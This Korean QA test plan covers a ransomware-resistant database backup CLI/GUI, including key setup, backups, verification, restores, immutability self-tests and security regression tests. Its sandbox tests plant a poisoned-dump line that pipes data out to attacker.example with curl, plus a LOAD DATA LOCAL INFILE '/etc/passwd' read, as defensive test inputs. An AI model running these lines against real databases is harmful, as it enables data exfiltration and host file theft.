# QA 테스트 시나리오 — 랜섬웨어 저항 DB 백업 도구

> 대상: Rust CLI + Tauri GUI.
> 근거 문서: `operation-scenarios.md`(메뉴/명령별 시나리오·E2E·화면흐름), `plan.md`(파이프라인·Critical Findings 대응 매핑),
> `team-review.md`(Critical/High findings), `spec.md`(Test Scenarios 섹션).
> 본 문서는 위 문서들을 **읽기 전용**으로 참조했으며 수정하지 않았다.

## 테스트 범위

- 12개 명령(init/doctor/test-connection/add-db/add-dest/run/verify/restore/rotate-key/prune/catalog rebuild/schedule) 중
  핵심 7종(init/run/verify/restore/destination self-test/schedule/rotate-key)은 상세 커버, 나머지는 요약 커버.
- team-review.md Critical/High findings(C1~C4, H1/H2, commit protocol)에 대한 명시적 회귀 테스트.
- operation-scenarios.md의 E2E 4종(특히 E2E-2 랜섬웨어→타PC 복구코드 복원).
- 파이프라인 통합 지점(finish 절단, 팬아웃 부분성공, catalog rebuild).

## 우선순위 기준

- **P0**: 데이터 유실/보안 붕괴/복구 불가로 직결. 릴리스 차단.
- **P1**: 핵심 기능 정상 흐름 또는 주요 실패 처리. 릴리스 전 필수.
- **P2**: 부가 기능/드문 경로. 회귀 스위트에는 포함하되 릴리스 차단은 아님.

---

## 메뉴/명령별 테스트 케이스

### 1. init — 키 셋업 마법사

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| INIT-001 | 정상 셋업(GUI) 전 스텝 완주 | 최초 설치, config/키 없음 | 환영→강한 비번 `Tr0ub4dor&3xyz!`→복구코드 1회 표시 후 "적어둠" 체크→DPAPI 등록 토글 ON→서명키 생성→왕복 검증 | 모든 스텝 통과, 대시보드로 전환, 리포에는 wrapped DEK 3종+공개키+암호화 config만 생성 | P0 |
| INIT-002 | CLI `restoreplane init` 정상 흐름 | 동일 | `restoreplane init` 실행, TTY 비번 입력(에코 없음), 복구코드 stdout 1회 출력, `--register-dpapi` 지정 | exit 0, "--- WRITE THIS DOWN ---" 배너 출력, ed25519 keypair 생성, roundtrip 자가 테스트 성공 로그 | P0 |
| INIT-003 | 약한 비밀번호 거부 | 신규 설치 | 비번 `123456`, `password`, `qwerty` 각각 입력 | 진행 버튼 비활성(GUI)/CLI는 비영시 재입력 요구, 강도 미터 "약함" + 사유 표시, 키 생성 안 됨 | P0 |
| INIT-004 | 복구 코드 미확인 시 진행 차단 | 복구코드 표시 화면 도달 | "적어둠" 체크박스를 클릭하지 않고 `다음` 클릭 | 다음 스텝 진입 차단, "비번 분실 시 영구 복구 불가" 경고 노출 | P1 |
| INIT-005 | DPAPI 등록 실패 시 폴백 | DPAPI API 강제 실패(모의 권한 거부) | DPAPI 등록 스텝 진행 | 치명 아님, "무인 자동실행 대신 매 실행마다 비번 입력" 안내 후 나머지 스텝 정상 진행, init 완료 | P1 |
| INIT-006 | 왕복 검증 실패 시 하드 정지 | config secret 암복호화 자가 테스트를 강제로 깨뜨림(모의 키 손상) | 왕복 검증 스텝 실행 | 하드 정지, 부분 생성된 wrap/config/서명키 파일 정리(clean-up), "신뢰 근원 깨진 채 진행 금지" 메시지, exit != 0 | P0 |
| INIT-007 | 복구 코드 1회 표시 재노출 불가 | init 완료 직후 | 복구 코드 표시 화면을 다시 요청(뒤로가기, 새로고침, `restoreplane init` 재실행 시도) | 평문 복구 코드가 두 번째로 노출되지 않음(재발급은 rotate-key 경로만 가능) | P2 |
| INIT-008 | config 이식성 — 다른 PC에서 비번으로 복호화 | init 완료된 config를 다른 머신에 그대로 복사(DPAPI 캐시 없음) | 새 PC에서 `restoreplane keys status` 또는 첫 명령 실행 시 마스터 비번 입력 | KEK 재유도 → DEK unwrap 성공 → config 복호화 성공(DPAPI 없이도 비번 경로로 동작) | P0 |

### 2. doctor — 환경/전제 진단

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| DOCTOR-001 | 전 항목 정상 시 전체 초록 | init 완료, DB 1+목적지 1 등록, 모두 정상 설정 | `restoreplane doctor` | 덤프 도구 버전/DPAPI/서명키/목적지 도달성/append-only 정합 모두 초록, "예약 백업이 조용히 실패할 이유 없음" | P1 |
| DOCTOR-002 | client_major < server_major 감지 | 서버 PG16, 번들 pg_dump 15 | `restoreplane doctor --db pg1` | 버전 매트릭스 항목 빨강, 감지된 서버/클라이언트 버전 표시 | P0 |
| DOCTOR-003 | 비파괴 확인 | 임의 상태 | `doctor` 반복 실행 전후 config/catalog/키 상태 비교 | doctor 실행으로 어떤 상태도 변경되지 않음(read-only) | P1 |
| DOCTOR-004 | `keys status`만 조회 | init 완료 | `restoreplane keys status` | 키/서명키/DPAPI 등록 상태만 출력, DB/목적지 점검 생략 | P2 |

### 3. test-connection — 연결 테스트

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| CONN-001 | DB 접속 성공 | 유효 자격증명 | `restoreplane test-connection --db pg1` | 초록 dot, 서버 버전 감지, (SSH면) host-key 지문 표시 | P1 |
| CONN-002 | 목적지 쓰기 가능 확인 | S3 목적지 등록 전 임시 입력 | `restoreplane test-connection --dest s3-primary` | 쓰기 가능 + Object Lock 모드/versioning/checksum 능력 배지 표시 | P1 |
| CONN-003 | host-key 핀 불일치 | 등록된 핀과 다른 host-key 응답(모의 MITM) | SSH 목적지/DB에 test-connection | **하드 경고**, 사용자 확인 없이 저장 금지 | P0 |
| CONN-004 | 인증 실패/타임아웃 구분 | 잘못된 비번 / 방화벽 차단 각각 | test-connection 각각 실행 | 실패 사유가 "인증 실패"와 "타임아웃"으로 구분 표시, 등록은 비파괴 유지 | P2 |

### 4. add-db — 백업 원본 등록

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| ADDDB-001 | Postgres 정상 등록 | init 완료 | `restoreplane add-db --engine postgres --host 10.0.0.5 --port 5432 --user backup_ro --tunnel ssh://bastion` | config에 DB 항목 추가, secret 필드 `enc:...`로 저장, globals(pg_dumpall --globals-only) 1급 기록 | P1 |
| ADDDB-002 | MySQL 엔진 스캔 — MyISAM 경고 | 대상 DB에 MyISAM 테이블 존재 | `restoreplane add-db --engine mysql --host ...` 후 스캔 | non_transactional_tables 경고 기록, 백업 창 DDL 회피 안내 | P1 |
| ADDDB-003 | 버전 불일치 등록 시 경고 플래그 | client_major(15) < server_major(16) | add-db 등록 진행 | 저장은 되나 경고 플래그 남음, 이후 doctor/run에서 하드 페일 트리거로 이어짐 | P1 |
| ADDDB-004 | 자격증명 암호화 저장 검증 | add-db 완료 | config 파일 grep | 평문 비밀번호 문자열이 config에 존재하지 않음(`enc:` 프리픽스만) | P0 |

### 5. add-dest — 목적지 등록

(불변성 게이트 관련 상세 테스트는 "destination self-test" 절 참조)

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| ADDDEST-001 | S3 Object Lock Governance 정상 등록 | 버킷 versioning ON, Object Lock Governance 설정됨 | `restoreplane add-dest --type s3 --bucket bak-off --endpoint https://s3... --object-lock governance` | 불변성 capability 배지 "Object Lock(Governance)" 표시, DestCaps 기록 | P0 |
| ADDDEST-002 | SSH 목적지 등록 | 바스티온 접근 가능 | `restoreplane add-dest --type ssh --host bastion --path /backups` | host-key 핀 저장, 등록 성공 | P1 |
| ADDDEST-003 | Local/NAS 최소 방어선 등록 | 로컬 경로 접근 가능 | `restoreplane add-dest --type local --path D:\backup-spool` | 등록 성공, "불변 아님" 배지(최소 방어선 표시) | P2 |
| ADDDEST-004 | Compliance 모드 opt-in 경고 | S3 목적지 | Object Lock 모드로 Compliance 선택 | "자기잠금 위험" 명시 경고 후 재확인 요구, 무확인 시 저장 차단 | P1 |

### 6. run — 백업 실행

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| RUN-001 | 전체 정상 백업, 다중 목적지 성공 | init+DB2개+목적지2개(S3,Local) | `restoreplane run` | 각 목적지에 암호문 객체+서명 매니페스트 업로드, catalog에 backups/artifacts 기록, L1/L2 자동 통과, 카드 "불변"+"L2" 배지 | P0 |
| RUN-002 | dry-run은 실제 업로드 없음 | 동일 | `restoreplane run --dry-run` | plan/버전검증만 수행, 목적지에 신규 객체 0개, catalog 변경 없음 | P1 |
| RUN-003 | 특정 DB만 실행 | DB 3개 등록 | `restoreplane run --db pg1` | pg1만 백업 실행, 나머지 DB는 대상에서 제외, catalog에 pg1만 신규 기록 | P1 |
| RUN-004 | DB 접속 실패 시 격리 실패 | pg2 접속 정보 고의로 오류 | `restoreplane run`(pg1 정상, pg2 오류) | pg2만 실패 처리 및 알림, pg1은 정상 완료, 프로세스 종료코드로 부분실패 신호 | P0 |
| RUN-005 | 버전 불일치 HARD FAIL | client_major(15) < server_major(16) | `restoreplane run --db pg1` | 해당 DB HARD FAIL, 손상 덤프 생성/업로드 안 됨, 알림 발송, 다른 DB는 정상 진행 | P0 |
| RUN-006 | 목적지 일부 단절 시 부분 성공 | S3는 정상, SSH 목적지 강제 단절 | `restoreplane run` | S3 업로드 성공, SSH는 재시도 후 실패, 최종 리포트 "부분 성공"(오렌지, 초록 아님) | P1 |
| RUN-007 | 대용량 스트리밍 중 네트워크 순단 재개 | 업로드 도중 네트워크 5초 단절(모의) | `restoreplane run --db pg-large` | multipart 재시도/재개로 최종 성공 또는 명확한 실패+부분객체 정리, 고아 파트 없음 | P2 |
| RUN-008 | MyISAM 경고 매니페스트 반영 | MySQL DB에 MyISAM 존재 | `restoreplane run --db mysql1` | 매니페스트 필드에 non_transactional_tables 경고 포함 | P2 |
| RUN-009 | globals 포함 및 pairs 기록 | PostgreSQL 서버 | `restoreplane run --db pg1` | globals(pg_dumpall --globals-only) 백업이 별도 아티팩트로 생성, 매니페스트에 pairs_with_globals_backup_id 기록 | P1 |
| RUN-010 | finish 누락 시 커밋 안 됨 | 파이프라인 중간(zstd→age 사이) 강제 kill(모의) | 백업 실행 중 프로세스 강제 종료 | 재시작 후 catalog/목적지에 해당 백업이 존재하지 않음(죽은 백업 방지) — 상세는 SEC-COMMIT 절 | P0 |

### 7. verify — 백업 검증

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| VERIFY-001 | L1 재복호+재해시 대조 | 정상 백업 1건 존재 | `restoreplane verify --backup <id> --level l1` | 재복호→재해제→평문 blake3가 매니페스트 값과 일치, catalog에 verified/L1 기록 | P0 |
| VERIFY-002 | L2 구조 파싱 성공 | 동일 | `restoreplane verify --backup <id> --level l2` | pg_restore --list 파싱 성공, verified/L2 기록 | P1 |
| VERIFY-003 | L3 샌드박스 전체 복원 통과 | 임시 인스턴스(Docker) 가용 | `restoreplane verify --latest --level l3` | 샌드박스 복원 후 스키마 해시/행 수가 원본과 일치, "L3 복원 통과" 배지, catalog에 verified/L3 기록 | P0 |
| VERIFY-004 | 서명 검증 실패 시 하드 거부 | 매니페스트 서명 바이트 1비트 변조 | `restoreplane verify --backup <id> --level l1` | 진행 전 서명 검증에서 즉시 거부, danger 배지, L1 로직 미실행 | P0 |
| VERIFY-005 | 체크섬 불일치 시 unverified | 목적지 객체를 의도적으로 변조(1바이트 손상) | verify 실행 | 해당 백업 unverified 표시 + 알림, "다른 시점 백업으로 대체 검증" 유도 문구 | P1 |
| VERIFY-006 | 서로 다른 메이저 버전 임시 인스턴스 매핑 | 원본 PG16, verify 시 Docker 이미지 자동 선택 | L3 verify 실행 | 원본과 동일 메이저 버전 이미지가 선택됨(버전 불일치로 인한 오탐 방지) | P2 |

### 8. restore — 복원 마법사

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| RESTORE-001 | 샌드박스 정상 복원(비번 경로) | 정상 백업 존재, 이 PC에 DPAPI/비번 가용 | `restoreplane restore --backup <id> --to sandbox` | 서명 검증 통과→DEK unwrap→복호화→해제→샌드박스 복원 성공, 행 수/체크섬 요약 출력 | P0 |
| RESTORE-002 | 실제 DB 복원 시 문구 재입력 마찰 | 샌드박스 선복원 완료 | GUI: `복원 대상=실제 DB` 선택, 확인 문구 미입력 상태로 진행 시도 | 문구를 정확히 재입력하기 전에는 실행 버튼 비활성/실행 차단, 덮어쓰기 경고 노출 | P0 |
| RESTORE-003 | 복구 코드 경로 복원(비번 분실 가정) | 대상 PC에 DPAPI 캐시 없음, 마스터 비번 모름 | `restoreplane restore --backup <id> --to sandbox --recovery-code` | 복구 코드만으로 DEK unwrap 성공, 복원 완료 | P0 |
| RESTORE-004 | 서명 검증 실패 시 진행 불가 | 매니페스트 위조(서명 불일치) | restore 시도 | 진행 자체가 차단됨(위조 가능성), "원본 목적지에서 다른 시점 재시도" 안내 | P0 |
| RESTORE-005 | DEK unwrap 실패(오입력) | 마스터 비번 오입력 | 비번 오입력 후 재시도, 세 경로(비번/복구코드/DPAPI) 모두 실패 상황 재현 | 오입력 시 재입력 요구, 세 경로 모두 실패 시 "이 백업은 이 키셋으로 열 수 없음"을 정직하게 안내(성공한 것처럼 보이지 않음) | P1 |
| RESTORE-006 | 실제 DB 복원 중 오류 시 부분 복원 방지 | 복원 도중 강제 오류(디스크 풀 모의) | 실제 DB 복원 실행 중 오류 유발 | 부분 적용된 스키마/데이터가 남지 않도록 트랜잭션/단계적 롤백 처리, 대상 DB가 복원 전 상태 또는 명확한 실패 상태로 남음(중간 상태 아님) | P1 |
| RESTORE-007 | 다른 PC 이식성 재확인 | 백업 생성 PC와 다른 PC | 다른 PC에서 RESTORE-003과 동일 절차 | 동일 결과(이식성 증명), PC 고유 상태(DPAPI blob 등) 의존 없음 | P0 |

### 9. destination self-test — 목적지 불변성/쓰기권한 자가 테스트

목적지 등록 시 1회성 점검(add-dest/test-connection)과, `run` 매 회 반복되는 자가 테스트(plan.md "매 run 불변성 자가 테스트")를 함께 다룬다.

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| DESTSELF-001 | 등록 시 Object Lock capability 정상 감지 | versioning ON, Object Lock Governance 설정된 버킷 | add-dest 진행 | "불변(Object Lock)" 배지 표시, DestCaps.immutability=Governance 기록 | P0 |
| DESTSELF-002 | versioning OFF 버킷 경고 | versioning 미설정 버킷 | add-dest 진행 | "이 버킷은 랜섬웨어에 삭제될 수 있습니다" 경고 + IAM 정책 템플릿 링크, 저장은 허용하되 경고 유지 | P1 |
| DESTSELF-003 | 과권한 자격증명 거부/loud-warn | 쓰기 자격증명에 s3:DeleteObject 권한 포함(모의 과권한 IAM) | add-dest 진행 | 거부 또는 loud-warn(append-only 원칙 위반 명시), 조용히 통과하지 않음 | P0 |
| DESTSELF-004 | 매 run probe key 삭제 거부 확인(정상) | append-only(PutObject only) 자격증명 | `restoreplane run` | probe key로 DeleteObject/PutLifecycle 시도 → 거부 확인됨, versioning ON+기본 보존 확인, "이 목적지는 안전" 상태로 백업 진행 | P0 |
| DESTSELF-005 | 자가 테스트가 실패해야 정상인 경우 — 삭제가 허용되는 오설정 감지 | 자격증명에 실수로 Delete 권한 부여(오설정 재현) | `restoreplane run` | probe key의 DeleteObject가 **성공**해버림 → 자가 테스트는 "실패"를 리포트, 백업 데이터는 업로드하되 대시보드에 loud-warn("이 목적지는 랜섬웨어에 취약") 남김, 조용히 넘어가지 않음 | P0 |
| DESTSELF-006 | SSH host-key 핀 불일치 하드 경고 | 등록된 지문과 다른 host-key(모의 MITM) | test-connection 또는 run 중 SSH 접속 | 하드 경고, 사용자 명시 확인 없이는 저장/업로드 금지 | P0 |
| DESTSELF-007 | Compliance 모드 자기잠금 방지 | Object Lock Compliance 선택 시도 | add-dest에서 Compliance 선택 | 명시적 opt-in 경고 없이는 저장 불가, 기본값은 Governance | P1 |
| DESTSELF-008 | 3목적지 팬아웃에서 목적지별 독립 capability 평가 | S3(불변)+SSH(비불변)+Local(비불변) 동시 등록 | run 실행, job이 "불변 목적지 1개 이상" 요구 | S3만 불변 배지, SSH/Local은 비불변 표시로 각각 정확히 구분(위장 없음) | P1 |

### 10. schedule — 무인 스케줄 등록

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| SCHED-001 | cron 등록 및 프리뷰 | init+DPAPI 등록 완료 | `restoreplane schedule --cron "0 3 * * *" --start-when-available --notify webhook:https://...` | schtasks XML 등록, 다음 실행 시각 프리뷰 정확, RPO 한계 배너 표시 | P1 |
| SCHED-002 | DPAPI 미등록 상태 예약 시 경고 | DPAPI 미등록 | `restoreplane schedule --cron "0 3 * * *"` | "무인 경로 없음 → 예약 실행이 비번 프롬프트에서 멈춘다" 하드 경고, 등록 유도(등록 자체는 가능하되 경고 필수) | P1 |
| SCHED-003 | 겹침 시 overlap guard | 이미 실행 중인 run이 있는 상태 | catch-up 트리거 또는 수동 run이 겹치도록 실행 | named mutex/runs unique index로 두 번째 실행 스킵, 로그 남음, 두 프로세스가 동시에 같은 스풀에 쓰지 않음 | P0 |
| SCHED-004 | 절전/종료 후 catch-up | 예약 시각(03:00)에 PC 꺼짐 | PC를 03:00 이후 부팅 | StartWhenAvailable로 밀린 백업이 부팅 후 자동 실행, 카드의 "마지막 백업 시각"이 catch-up 시각으로 갱신 | P1 |
| SCHED-005 | 목록/제거 정상 동작 | 스케줄 1개 이상 등록됨 | `restoreplane schedule --list`, `restoreplane schedule --remove <task>` | 등록된 작업 목록 정확 표시, 제거 후 Task Scheduler에서도 삭제 확인 | P2 |

### 11. rotate-key — 키/비밀번호 회전

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| ROTATE-001 | 마스터 비번 회전 정상 | 현재 비번으로 인증 가능, 기존 백업 N개 존재 | `restoreplane rotate-key --master-password`(현재 비번 인증→새 비번 입력) | 새 비번으로 KEK 재유도, DEK 재wrap, 회전 후 왕복 검증 통과, 기존 백업 샘플 복호 테스트 성공 | P0 |
| ROTATE-002 | 복구 코드 재발급 | 현재 인증 가능 | `restoreplane rotate-key --recovery-code` | 새 복구 코드 1회 표시 경고 모달 재현, 이전 복구 코드는 더 이상 유효하지 않음 | P1 |
| ROTATE-003 | 서명키 교체 및 공개키 이력 보존 | 기존 서명키로 서명된 매니페스트 다수 존재 | `restoreplane rotate-key --signing-key` | 새 개인키로 이후 매니페스트 서명, 과거 매니페스트는 옛 공개키로 계속 검증 가능(키 이력 보존), verify 재실행 시 과거 백업도 정상 통과 | P0 |
| ROTATE-004 | 회전 후 옛 백업 복호 실패 시 롤백 | 회전 로직에 결함 주입(모의: 재wrap 후 unwrap 실패) | `restoreplane rotate-key --master-password` 진행 중 옛 백업 복호 테스트 강제 실패 | 회전이 **롤백**되어 기존 wrap 유지, 회전 중단 메시지, 이 시점 이후에도 옛 비번/복구코드로 기존 백업 복원 가능 상태 유지 | P0 |
| ROTATE-005 | 현재 인증 실패 시 회전 거부 | 잘못된 현재 비번 입력 | rotate-key 시도 | 인증 실패로 회전 거부, 기존 키 체계 변경 없음 | P1 |
| ROTATE-006 | 새 PC에서 DPAPI 재등록 | PC 이관, 비번/복구코드로 config 접근 가능 | `restoreplane register-dpapi` | 새 PC 로컬 DPAPI Machine-scope + keyfile entropy 재생성, 이후 무인 run 가능 | P1 |
| ROTATE-007 | 서명키 이력 미보존 경고 | 서명키 교체 시 이전 공개키 삭제 시도(모의 오조작) | 이전 공개키 삭제 플로우 시도 | 과거 백업 검증 불가 위험을 하드 경고, 명시 확인 없이는 삭제 진행 안 됨 | P1 |

### 12. prune / catalog rebuild — 요약

| TC-ID | 목적 | 전제 | 입력/단계 | 기대결과 | 우선순위 |
|---|---|---|---|---|---|
| PRUNE-001 | 오프호스트 프로파일 정상 삭제(dry-run→confirm) | 격리 프로파일(offhost-mfa), 90일 초과 백업 존재 | `restoreplane prune --profile offhost-mfa --older-than 90d --dry-run` 후 `--confirm` | dry-run은 후보만 나열(삭제 없음), confirm 시 보존 만료 객체만 삭제, 감사 로그 기록 | P1 |
| PRUNE-002 | 보존기간 미만 삭제 시도 거부 | Object Lock 보존기간 미만 객체 | prune 대상에 미만료 객체 포함 시도 | 목적지가 Deny, 삭제되지 않음 | P0 |
| CATREBUILD-001 | 정상 재구성 | catalog.db 삭제/손상, 목적지에 서명 매니페스트 다수 존재 | `restoreplane catalog rebuild --from s3-primary` | 매니페스트 수집→서명 검증→통과분만 반영, 로컬 catalog가 목적지 실제 상태와 일치 | P0 |
| CATREBUILD-002 | 위조 매니페스트 격리 | 목적지에 서명 불일치 매니페스트 1건 주입 | catalog rebuild 실행 | 해당 매니페스트는 카탈로그에 반영되지 않고 격리 보고(위조 의심 로그) | P0 |

---

## 보안 회귀 테스트 (Critical 대응 검증)

team-review.md의 각 Critical/High finding에 대해, "완화가 실제로 유지되는가"를 증명하는 회귀 케이스.
전부 P0 — 회귀 시 랜섬웨어 방어 모델 자체가 붕괴하므로 릴리스 차단.

### C1 — DPAPI Machine-scope 구멍 (entropy 하드코딩 금지)

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| SEC-C1-01 | entropy가 keyfile에서 유도되며 바이너리에 없음 | 릴리스 바이너리에 `strings`/objdump로 정적 문자열 스캔, entropy 후보 패턴 검색 | 고정된 entropy 값이 바이너리 내에 존재하지 않음 |
| SEC-C1-02 | keyfile 없이는 DPAPI 경로 무효 | keyfile을 삭제한 상태로 `restoreplane run`(무인) 실행 | DPAPI 경로로 KEK 복원 실패, 비번/복구코드 경로로 폴백 요구(하드코딩 entropy만으로 복원되지 않음) |
| SEC-C1-03 | keyfile이 리포/원격에 커밋되지 않음 | `.gitignore` 정적 검사 + `git log --all -- **/keyfile*` | keyfile 경로가 이력상 커밋된 적 없음 |
| SEC-C1-04 | 최소권한 계정만 keyfile 접근 | keyfile ACL 확인, 비관리자/다른 로컬 계정으로 읽기 시도 | 스케줄러 서비스 계정 외 읽기 거부(권한 오류) |
| SEC-C1-05 | DPAPI blob이 리포에 커밋되지 않음 | `.gitignore` + git 이력 스캔 | DPAPI blob 파일이 이력상 존재하지 않음 |

### C2 — 정적 DEK 금지 (백업별 DEK, blast radius = 1)

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| SEC-C2-01 | 백업마다 DEK가 다름 | 연속 3회 run 실행 후 각 매니페스트의 wrap 스탠자(암호문) 비교 | 세 백업의 DEK 파생 결과(wrap 암호문)가 모두 상이 |
| SEC-C2-02 | 한 DEK 유출 시 다른 백업 복호 불가 | 백업 A의 unwrap된 평문 DEK를 확보한 뒤, 이 DEK로 백업 B의 payload(age/chacha20poly1305) 복호 시도 | 백업 B 복호 실패(다른 DEK이므로), 유출 영향이 백업 A 1건에 한정됨 |
| SEC-C2-03 | DEK가 32B 랜덤, 예측 불가 | 다수 백업의 DEK 파생 샘플 수집 후 엔트로피/반복성 검사 | 반복되는 DEK 없음, 통계적으로 랜덤 |
| SEC-C2-04 | age multi-recipient wrap이 백업 단위로 재생성 | 매니페스트의 wrap#1/#2/#3 스탠자를 백업별로 비교 | 동일 비번/복구코드/DPAPI 경로라도 백업마다 wrap 암호문이 다름(DEK가 다르므로) |

### C3 — 미서명/위조 매니페스트 거부, 포이즌 덤프 샌드박스 봉쇄

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| SEC-C3-01 | 미서명 매니페스트 거부 | 매니페스트에서 서명 필드를 제거한 뒤 restore/verify 실행 | 즉시 하드 거부, DEK unwrap 단계로 진행하지 않음 |
| SEC-C3-02 | 위조(변조) 매니페스트 거부 | 서명된 매니페스트의 도메인 필드 1개(예: backup_id) 변조 후 restore 실행 | 서명 검증 실패로 거부, danger 배지, 원본과 다른 시점 재시도 안내 |
| SEC-C3-03 | 서명 검증이 unwrap보다 선행 | restore 파이프라인 계측(순서 로그) | 서명 검증 실패 케이스에서 DEK unwrap/복호화 코드 경로가 전혀 호출되지 않음 |
| SEC-C3-04 | 포이즌 덤프의 아웃바운드 네트워크 완전 차단 | 정상 DEK로 유효하게 암호화·서명된 백업이지만, 덤프 내용에 `COPY (SELECT ...) TO PROGRAM 'curl attacker.example/exfil'` 삽입 후 L3 verify/restore --to sandbox 실행 | 샌드박스에서 외부 curl 호출이 네트워크 레벨에서 차단(연결 실패/타임아웃), 데이터 유출 없음 |
| SEC-C3-05 | COPY PROGRAM 자체가 차단 | 덤프에 `COPY ... FROM PROGRAM` / `COPY ... TO PROGRAM` 포함 | pg_restore 옵션/샌드박스 정책으로 PROGRAM 실행 자체가 거부되거나 무력화(에러로 실패, 명령 미실행) |
| SEC-C3-06 | MySQL LOAD DATA LOCAL 무력화 | 덤프에 `LOAD DATA LOCAL INFILE '/etc/passwd'` 유형 구문 포함 | 샌드박스 `local_infile=0`으로 로컬 파일 읽기 실패, 호스트 파일시스템 접근 없음 |
| SEC-C3-07 | 슈퍼유저 미부여, --no-privileges | L3 샌드박스 복원 시 사용된 DB 계정/권한 확인 | 복원 계정이 슈퍼유저가 아님, `pg_restore --no-privileges` 적용 확인 |
| SEC-C3-08 | 비특권 컨테이너, 호스트 격리 | 샌드박스 프로세스의 권한/네임스페이스 확인, 호스트 파일시스템 마운트 여부 확인 | 비특권 컨테이너로 실행, 호스트 임의 경로에 쓰기 불가, 컨테이너 종료 후 호스트에 흔적 없음 |
| SEC-C3-09 | 대칭 AEAD만으로는 위조 방지 안 됨을 반증(음성 테스트) | 서명 없이 payload AEAD만 유효한 위조 백업 생성 시도 | AEAD 무결성은 통과하더라도 서명 검증 게이트에서 거부됨(무결성≠출처인증 구분 확인) |

### C4 — 오프라인 브루트포스 방지 (강한 비번 게이트, wrap 공개 리포 제외)

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| SEC-C4-01 | zxcvbn 약한 비번 거부 | init/rotate-key에 `123456`, `qwerty123`, `password1!` 입력 | 모두 거부, 강도 미터 근거와 함께 진행 차단 |
| SEC-C4-02 | 강한 비번 통과 | Argon2id 파라미터(m=64MiB,t=3,p=1) 조건에서 고엔트로피 비번 입력 | 정상 진행 및 키 생성 |
| SEC-C4-03 | wrap/salt/config가 공개 리포에 없음 | git 리포 전체 파일 트리 + 커밋 이력에서 wrapped DEK/salt/Argon2id 파라미터/복구코드/평문 config 패턴 검색 | 리포에는 코드만 존재, wrap/salt/복구코드/keyfile이 커밋 이력 어디에도 없음 |
| SEC-C4-04 | 공격자가 리포만 확보한 시나리오 재현 | 공개 리포만 클론한 환경에서 오프라인 브루트포스 시도(대상 wrap 파일 없음) | 공격 대상 자체(wrap/salt)가 없어 오프라인 브루트포스 불가능함을 확인 |
| SEC-C4-05 | Argon2id 파라미터 존재 확인 | 실제 KEK 유도 시 소요 시간/메모리 측정 | 설정된 m=64MiB,t=3,p=1 수준의 계산 비용이 실제로 적용됨(경량화 우회 없음) |

### H1/H2 — append-only 강제, prune 백업호스트 실행 금지

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| SEC-H1-01 | 백업 호스트에서 prune 원천 거부 | 백업 호스트(무인 run과 동일 신원)에서 `restoreplane prune --profile offhost-mfa --older-than 90d --confirm` 강제 실행 | prune 자격증명 자체가 로드되지 않아 명령이 실패(자격증명 부재), 어떤 객체도 삭제되지 않음 |
| SEC-H1-02 | 무인 run 프로파일이 prune 자격증명 미보유 | 무인 run 프로세스의 설정/환경/메모리에서 prune 자격증명 존재 여부 점검 | run 프로파일 설정 파일/프로세스 컨텍스트 어디에도 prune 자격증명이 로드되지 않음 |
| SEC-H2-01 | 매 run 삭제 거부 자가 테스트(정상 케이스) | append-only(PutObject only) 자격증명으로 run 실행 | probe key의 DeleteObject/PutLifecycle 시도가 목적지에서 거부됨(자가 테스트 "통과") |
| SEC-H2-02 | 자가 테스트가 실패하는 경우(오설정) → loud-warn | 자격증명에 실수로 Delete 권한 부여(오설정 재현) 후 run 실행 | probe key 삭제가 **허용**되어 자가 테스트가 "실패"로 판정됨, 이 상태가 조용히 넘어가지 않고 대시보드/로그에 loud-warn("이 목적지는 랜섬웨어에 취약")이 남음, 백업 자체는 계속 진행(가용성 우선) |
| SEC-H2-03 | versioning/기본 보존 확인 | 목적지 버킷의 versioning을 의도적으로 OFF | run 실행 시 자가 테스트가 versioning OFF를 탐지해 경고 남김 |
| SEC-H2-04 | 만료 전 Object Lock 삭제 시도 거부(정상) | 오프호스트 MFA 프로파일이라도 보존기간 미만 객체 삭제 시도 | Governance/Compliance 보존기간이 남아있으면 목적지가 Deny(사람의 실수도 방어) |

### Commit Protocol — 절단 덤프가 유효 백업으로 커밋되지 않음

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| SEC-COMMIT-01 | 자식 프로세스 비정상 종료 시 미커밋 | pg_dump 프로세스를 exit code 1로 강제 종료(모의 실패) | 백업이 catalog/목적지에 커밋되지 않음, 스풀 파일 정리(고아 파일 없음), FAIL 리포트 |
| SEC-COMMIT-02 | 절단 스트림 미커밋 | 덤프 스트림 전송 도중(zstd 인코딩 50% 지점) 프로세스 강제 종료 | zstd.finish()/age.finish()가 완료되지 않았으므로 스풀파일이 유효 백업으로 인정되지 않음, catalog 미기록, 목적지 미업로드 |
| SEC-COMMIT-03 | 전원 차단급 강제 종료(kill -9 상당) 후 재시작 정합성 | run 중간(스풀 flush 이전)에 프로세스를 SIGKILL 상당으로 종료 후 도구 재시작 | 재시작 후 catalog에 해당 백업 없음, 스풀 디렉터리에 남은 임시 파일이 있어도 "완료"로 오인되지 않음(별도 정리 대상으로만 취급) |
